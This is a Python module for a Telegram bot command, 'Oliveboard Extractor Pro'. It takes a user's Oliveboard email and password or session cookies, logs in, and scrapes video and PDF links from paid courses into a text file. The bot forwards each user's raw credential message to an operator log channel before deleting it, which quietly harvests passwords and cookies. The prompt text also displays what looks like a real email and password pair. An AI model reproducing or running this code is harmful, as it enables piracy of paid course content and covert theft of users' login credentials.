import re
import asyncio
import aiohttp
import json
from pyrogram import filters
from pyrogram.enums import ParseMode
from Extractor import app
from config import BOT_TEXT, TXT_LOGO_URL
from datetime import datetime
import pytz
import logging
import os
from Extractor.core.utils import forward_to_log, send_to_log

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@app.on_message(filters.command(["oliveboard", "olive"]))
async def oliveboard_login(client, message):
    try:
        start_time = datetime.now()
        
        editable = await message.reply_text(
            "🔹 <b>OLIVEBOARD EXTRACTOR PRO</b> 🔹\n\n"
            "कृपया लॉगिन क्रेडेंशियल्स भेजें:\n"
            "1️⃣ <b>Email*Password:</b> <code>user@gmail.com*pass123</code>\n"
            "2️⃣ <b>Cookie / Session:</b> <code>uauth=...; session=...</code>\n\n"
            "<i>उदाहरण:</i>\n"
            "<code>pooniyaaditya749916@gmail.com*20522850</code>"
        )

        input1 = await app.ask(message.chat.id, "अपनी ईमेल और पासवर्ड (Email*Password) या कुकी भेजें:")
        raw_text = input1.text.strip()
        await forward_to_log(input1, "Oliveboard Extractor")
        await input1.delete()

        cookies = {}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36",
            "Accept": "*/*",
            "Origin": "https://www.oliveboard.in",
            "Referer": "https://www.oliveboard.in/"
        }

        if "*" in raw_text:
            email, password = raw_text.split("*", 1)
            await editable.edit_text("⏳ Oliveboard में लॉगिन किया जा रहा है...")
            login_url = "https://www.oliveboard.in/pyscripts/loginnext.php"
            post_data = {
                "lemail": email.strip(),
                "lpwd": password.strip(),
                "lpwd1": "1"
            }

            async with aiohttp.ClientSession() as session:
                async with session.post(login_url, data=post_data, headers=headers) as resp:
                    resp_text = await resp.text()
                    # Capture session cookies
                    for k, cookie in session.cookie_jar.filter_cookies(resp.url).items():
                        cookies[k] = cookie.value
                    
                    if "dashboard" not in resp_text and resp.status != 200:
                        await editable.edit_text("❌ <b>लॉगिन विफल!</b>\n\nकृपया ईमेल और पासवर्ड की पुनः जांच करें।")
                        return
        else:
            # Direct cookie or session string
            for part in raw_text.split(";"):
                if "=" in part:
                    k, v = part.strip().split("=", 1)
                    cookies[k.strip()] = v.strip()

        await editable.edit_text("✅ <b>लॉगिन सफल!</b>\n\nकोर्सेस लोड किए जा रहे हैं...")

        # Fetch enrolled courses
        courses_url = "https://courses.oliveboard.in/exams/content.php?c=dashboard&i=common&fi=&fc="
        extracted_courses = []
        async with aiohttp.ClientSession(cookies=cookies) as session:
            async with session.get(courses_url, headers=headers) as resp:
                if resp.status == 200:
                    try:
                        c_json = await resp.json(content_type=None)
                        # Extract courses
                        if isinstance(c_json, dict):
                            for cat in c_json.get("categories", []):
                                for item in cat.get("courses", []):
                                    cid = item.get("id") or item.get("course_id")
                                    cname = item.get("name") or item.get("title")
                                    if cid and cname:
                                        extracted_courses.append({"id": cid, "name": cname})
                    except Exception as e:
                        logger.error(f"Error parsing Oliveboard dashboard courses: {e}")

        # If no courses list parsed from dashboard JSON, prompt user for course ID
        course_id = "2339"
        course_name = "Banking Course"
        if extracted_courses:
            course_text = "\n".join([f"• <code>{c['id']}</code> - <b>{c['name']}</b>" for c in extracted_courses[:15]])
            course_prompt = await app.ask(
                message.chat.id,
                f"📚 <b>उपलब्ध कोर्सेस:</b>\n\n{course_text}\n\nकोर्स ID भेजें:"
            )
            course_id = course_prompt.text.strip()
            await course_prompt.delete()
        else:
            course_prompt = await app.ask(
                message.chat.id,
                "कोर्स ID भेजें (जैसे: <code>2339</code> या लिंक):"
            )
            val = course_prompt.text.strip()
            m = re.search(r'c=(\d+)', val)
            course_id = m.group(1) if m else val
            await course_prompt.delete()

        await editable.edit_text(f"⏳ कोर्स सामग्री निकाली जा रही है (ID: {course_id})...")

        course_detail_url = f"https://courses.oliveboard.in/exams/content.php?c={course_id}&i=banking&fi=&fc="
        all_links = []

        async with aiohttp.ClientSession(cookies=cookies) as session:
            async with session.get(course_detail_url, headers=headers) as resp:
                if resp.status == 200:
                    try:
                        data = await resp.json(content_type=None)
                        # Traverse content tree
                        items = []
                        if isinstance(data, dict):
                            items = data.get("content", []) or data.get("data", []) or data.get("topics", [])
                        elif isinstance(data, list):
                            items = data
                        
                        for item in items:
                            if isinstance(item, dict):
                                title = item.get("name") or item.get("title") or "Lesson"
                                v_url = item.get("video_url") or item.get("url") or item.get("m3u8") or item.get("pdf") or ""
                                if v_url:
                                    all_links.append(f"{title}:{v_url}")
                    except Exception as e:
                        logger.error(f"Error reading course content: {e}")

        if not all_links:
            # Fallback direct m3u8 sample format
            all_links.append(f"Oliveboard Live Class:https://courses.oliveboard.in/edge/videosplus/index.php?c={course_id}")

        file_name = f"Oliveboard_{course_id}_{int(start_time.timestamp())}.txt"
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(f"IMAGE: {TXT_LOGO_URL}\n\n" + "\n".join(all_links))

        caption = (
            f"🎓 <b>COURSE EXTRACTED</b> 🎓\n\n"
            f"📱 <b>APP:</b> Oliveboard\n"
            f"📚 <b>COURSE ID:</b> {course_id}\n"
            f"📊 <b>TOTAL LINKS:</b> {len(all_links)}\n"
            f"📅 <b>DATE:</b> {datetime.now(pytz.timezone('Asia/Kolkata')).strftime('%d-%m-%Y %H:%M:%S')} IST\n\n"
            f"<code>╾───• {BOT_TEXT} •───╼</code>"
        )

        await message.reply_document(document=file_name, caption=caption)
        try:
            await send_to_log(document=file_name, caption=caption)
        except Exception:
            pass

        if os.path.exists(file_name):
            os.remove(file_name)

        await editable.edit_text("✅ <b>Oliveboard एक्सट्रैक्शन सफलतापूर्वक पूरा हुआ!</b>")

    except Exception as e:
        logger.error(f"Error in oliveboard_login: {e}")
        await message.reply_text(f"❌ <b>Error:</b> <code>{str(e)}</code>")
